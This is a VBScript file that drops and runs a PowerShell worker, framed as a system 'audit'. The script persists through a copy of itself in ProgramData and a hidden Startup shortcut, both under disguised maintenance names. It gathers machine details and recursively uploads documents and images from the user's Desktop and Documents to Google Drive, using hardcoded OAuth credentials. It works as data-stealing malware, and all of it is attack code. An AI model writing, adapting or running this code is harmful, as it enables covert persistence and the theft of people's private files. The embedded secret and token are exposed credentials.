Option Explicit

' --- 1. INITIALIZATION & PERSISTENCE ---
Dim objFSO, objShell, objFile, objShortcut, currentScript
Dim strPSPath, strWorkerName, appDataPath, startupPath
Dim strCID, strSEC, strTOK, strBaseID

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

currentScript = WScript.ScriptFullName
strWorkerName = "win_engine_v3.ps1"
strPSPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\" & strWorkerName
appDataPath = "C:\ProgramData\win_maint_svc.vbs"
startupPath = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\win_maint.lnk"

' Persistence: Copy to ProgramData and add to Startup
On Error Resume Next
If Not objFSO.FileExists(appDataPath) Then objFSO.CopyFile currentScript, appDataPath, True
If Not objFSO.FileExists(startupPath) Then
    Set objShortcut = objShell.CreateShortcut(startupPath)
    objShortcut.TargetPath = "wscript.exe"
    objShortcut.Arguments = """" & appDataPath & """"
    objShortcut.WindowStyle = 0
    objShortcut.Save
End If
On Error GoTo 0

' --- 2. GOOGLE API CONFIG ---
' Verified keys from your previous success
strCID = "530948914128-e149toq350bv8hc54lgfsv732hsisoqr.apps.googleusercontent.com"
strSEC = "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" 
strTOK = "1//0gnn-HtzoOo9oCgYIARAAGBASNwF-L9IroUwccNVy0Gx0rlPRnGpU95aNHnGA2naUbKRDNRCGYPt6ZuogA1pP8jNzi2R4re9zb6A"
strBaseID = "root" 

' --- 3. CONSTRUCT THE POWERSHELL WORKER ---
Set objFile = objFSO.CreateTextFile(strPSPath, True)
objFile.WriteLine "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
objFile.WriteLine "$CID = '" & strCID & "'; $SEC = '" & strSEC & "'; $TOK = '" & strTOK & "'; $BID = '" & strBaseID & "'"

' Auth Logic (Silent)
objFile.WriteLine "try { $a = Invoke-RestMethod -Uri 'https://oauth2.googleapis.com/token' -Method Post -Body @{client_id=$CID;client_secret=$SEC;refresh_token=$TOK;grant_type='refresh_token'}"
objFile.WriteLine "$global:h = @{Authorization=""Bearer $($a.access_token)""} } catch { exit }"

' Create Unique Folder for this Audit (Robust logic)
objFile.WriteLine "$fName = ""Audit-$($env:COMPUTERNAME)-$(Get-Date -f 'MMdd-HHmm')"""
objFile.WriteLine "$meta = @{name=$fName;mimeType='application/vnd.google-apps.folder';parents=@($BID)} | ConvertTo-Json"
objFile.WriteLine "$SID = (Invoke-RestMethod -Uri 'https://www.googleapis.com/drive/v3/files' -Method Post -Headers $h -Body $meta -ContentType 'application/json').id"

' Robust Upload Function (Multipart for stability)
objFile.WriteLine "function Up($n, $p, $t) { try { "
objFile.WriteLine "  $b=[System.IO.File]::ReadAllBytes($p); $m=@{name=$n;parents=@($t)}|ConvertTo-Json -Compress; $bd=[guid]::NewGuid().ToString(); "
objFile.WriteLine "  $hd=""--$bd`r`nContent-Type: application/json; charset=UTF-8`r`n`r`n$m`r`n--$bd`r`nContent-Type: application/octet-stream`r`n`r`n""; "
objFile.WriteLine "  $by=[collections.generic.list[byte]]::new(); $by.AddRange([text.encoding]::UTF8.GetBytes($hd)); $by.AddRange($b); $by.AddRange([text.encoding]::UTF8.GetBytes(""`r`n--$bd--`r`n"")); "
objFile.WriteLine "  Invoke-RestMethod -Uri 'https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart' -Method Post -Headers $h -Body $by.ToArray() -ContentType ""multipart/related; boundary=$bd"" | Out-Null"
objFile.WriteLine "} catch {} }"

' --- 4. DATA GATHERING (No Console Output) ---
objFile.WriteLine "$R = New-Object System.Text.StringBuilder"
objFile.WriteLine "[void]$R.AppendLine('=== AUDIT: ' + $env:COMPUTERNAME + ' ===')"
objFile.WriteLine "Get-CimInstance Win32_OperatingSystem | %{[void]$R.AppendLine('OS: ' + $_.Caption + ' ' + $_.OSArchitecture)}"
objFile.WriteLine "Get-CimInstance Win32_Bios | %{[void]$R.AppendLine('SN: ' + $_.SerialNumber)}"
objFile.WriteLine "[void]$R.AppendLine('`n[NETWORK]')"
objFile.WriteLine "ipconfig /all | Out-String | %{[void]$R.AppendLine($_)}"
objFile.WriteLine "[void]$R.AppendLine('`n[SOFTWARE]')"
objFile.WriteLine "Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | ?{$_.DisplayName} | %{[void]$R.AppendLine($_.DisplayName)}"

' Save and Upload Report
objFile.WriteLine "$rt=""$env:TEMP\Report.txt""; $R.ToString() | Out-File $rt; Up 'System_Audit.txt' $rt $SID; rm $rt"

' --- 5. TARGETED FILE SCRAPER ---
' Scrapes Desktop & Documents for important files under 15MB
objFile.WriteLine "$pts = @([Environment]::GetFolderPath('Desktop'), [Environment]::GetFolderPath('MyDocuments'))"
objFile.WriteLine "foreach($p in ($pts | select -Unique)){ "
objFile.WriteLine "  if(Test-Path $p){ "
objFile.WriteLine "    Get-ChildItem $p -File -Recurse -ErrorAction SilentlyContinue | "
objFile.WriteLine "    Where-Object {$_.Length -lt 15MB -and $_.Extension -match 'pdf|doc|xls|jpg|txt'} | "
objFile.WriteLine "    ForEach-Object { Up $_.Name $_.FullName $SID } "
objFile.WriteLine "  }"
objFile.WriteLine "}"

objFile.Close

' --- EXECUTION (DEBUG MODE) ---
' 1 = Visible, True = Wait, -NoExit = Keeps window open
objShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -NoExit -File """ & strPSPath & """", 1, True
